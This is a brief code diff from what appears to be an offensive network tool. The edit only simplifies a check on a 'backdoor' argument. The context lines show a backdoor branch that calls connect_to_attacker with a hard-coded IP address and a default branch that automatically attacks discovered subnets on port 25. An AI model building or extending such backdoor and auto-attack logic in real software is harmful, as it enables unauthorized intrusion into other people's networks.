@@ -152,7 +152,7 @@ def main():
         port = str(args.manual[1])
         print(port)
         attack(target, int(port))
-    elif args.backdoor != None:
+    elif args.backdoor:
     	connect_to_attacker("172.22.1.1")
     else:
         attack(find_subnets(), 25)  # auto attack
